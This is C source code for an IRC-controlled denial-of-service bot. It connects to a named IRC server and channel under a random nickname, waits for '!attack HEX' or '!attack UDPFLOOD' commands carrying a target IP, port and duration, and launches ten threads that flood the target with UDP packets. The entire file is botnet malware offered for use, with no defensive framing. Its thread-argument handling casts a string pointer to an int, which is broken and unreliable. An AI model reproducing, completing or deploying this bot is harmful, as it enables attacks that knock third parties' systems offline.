#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <time.h>
#include <stdarg.h>
#include <pthread.h>

#define SERVER "irc.shells.org"
#define PORT 7000
#define CHANNEL "#anontoken"
#define USERNAME "YourBotUsername"
#define REALNAME "YourBotRealname"
#define MAX_IP_LEN 16
#define NUM_THREADS 10

void send_data(int sockfd, const char *format, ...) {
    char buffer[512];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    write(sockfd, buffer, strlen(buffer));
    // printf("SENT: %s", buffer);  // Commented out to avoid printing to terminal
}

// Function to generate a random nickname
void generate_random_nick(char *nick, size_t length) {
    const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    for (size_t i = 0; i < length - 1; i++) {
        int key = rand() % (sizeof(charset) - 1);
        nick[i] = charset[key];
    }
    nick[length - 1] = '\0';
}

// UDP Flooder thread function
void *udp_flood_thread(void *arg) {
    struct sockaddr_in addr;
    int sockfd;
    char payload[] = "A";
    int total_sent = 0;
    int timeout = ((int*)arg)[0];
    const char *host = ((char**)arg)[1];
    int port = ((int*)arg)[2];

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        return NULL;
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);

    time_t end_time = time(NULL) + timeout;
    while (time(NULL) < end_time) {
        sendto(sockfd, payload, sizeof(payload) - 1, 0, (struct sockaddr*)&addr, sizeof(addr));
        total_sent += sizeof(payload) - 1;
    }

    close(sockfd);
    return NULL;
}

// Manager to handle multiple UDP flood threads
void udp_flood_manager(const char *host, int port, int timeout, int max_threads) {
    pthread_t threads[max_threads];
    int thread_args[max_threads][3];
    int i;

    for (i = 0; i < max_threads; i++) {
        thread_args[i][0] = timeout;
        thread_args[i][1] = (int)host; // Cast to int for simplicity
        thread_args[i][2] = port;
        pthread_create(&threads[i], NULL, udp_flood_thread, (void *)thread_args[i]);
    }

    for (i = 0; i < max_threads; i++) {
        pthread_join(threads[i], NULL);
    }
}

int main() {
    int sockfd;
    struct sockaddr_in server_addr;
    struct hostent *server;
    char nickname[10];
    char recv_buffer[512];
    char ip[MAX_IP_LEN];
    int port;
    int duration;
    int usage_sent = 0;

    // Seed the random number generator
    srand(time(NULL));

    // Generate a random nickname
    generate_random_nick(nickname, sizeof(nickname));

    // Create a socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket error");
        exit(1);
    }

    // Get server by name
    server = gethostbyname(SERVER);
    if (server == NULL) {
        fprintf(stderr, "Error: No such host\n");
        exit(1);
    }

    // Set up server address struct
    bzero((char *)&server_addr, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr, (char *)&server_addr.sin_addr.s_addr, server->h_length);
    server_addr.sin_port = htons(PORT);

    // Connect to the server
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection error");
        exit(1);
    }

    // Register the bot on the IRC server with a random nickname
    send_data(sockfd, "NICK %s\r\n", nickname);
    send_data(sockfd, "USER %s 0 * :%s\r\n", USERNAME, REALNAME);

    // Join the channel
    send_data(sockfd, "JOIN %s\r\n", CHANNEL);

    // Main loop to receive data and respond to server pings
    while (1) {
        bzero(recv_buffer, sizeof(recv_buffer));
        read(sockfd, recv_buffer, sizeof(recv_buffer) - 1);

        // Respond to PING messages
        if (strncmp(recv_buffer, "PING", 4) == 0) {
            send_data(sockfd, "PONG %s\r\n", recv_buffer + 5);
        }

        // Check for attack commands
        if (strstr(recv_buffer, "!attack HEX") != NULL) {
            // Extract the command parameters
            if (sscanf(recv_buffer, "!attack HEX %15s %d %d", ip, &port, &duration) == 3) {
                // Call the UDP flood manager for HEX attacks (use a single-threaded flood in this case)
                udp_flood_manager(ip, port, duration, NUM_THREADS);
                usage_sent = 0; // Reset usage message flag after a valid attack
            } else {
                // Send usage instructions to the channel only once
                if (!usage_sent) {
                    send_data(sockfd, "PRIVMSG %s :Usage: !attack HEX <ip> <port> <duration>\r\n", CHANNEL);
                    usage_sent = 1; // Set flag to avoid multiple usage messages
                }
            }
        } else if (strstr(recv_buffer, "!attack UDPFLOOD") != NULL) {
            // Extract the command parameters
            if (sscanf(recv_buffer, "!attack UDPFLOOD %15s %d %d", ip, &port, &duration) == 3) {
                // Call the UDP flood manager for UDPFLOOD attacks
                udp_flood_manager(ip, port, duration, NUM_THREADS);
                usage_sent = 0; // Reset usage message flag after a valid attack
            } else {
                // Send usage instructions to the channel only once
                if (!usage_sent) {
                    send_data(sockfd, "PRIVMSG %s :Usage: !attack UDPFLOOD <ip> <port> <duration>\r\n", CHANNEL);
                    usage_sent = 1; // Set flag to avoid multiple usage messages
                }
            }
        }

        // Join the #anontoken channel after registration (look for a numeric 001 code)
        if (strstr(recv_buffer, " 001 ") != NULL) {
            send_data(sockfd, "JOIN %s\r\n", CHANNEL);
        }
    }

    // Close the socket
    close(sockfd);

    return 0;
}
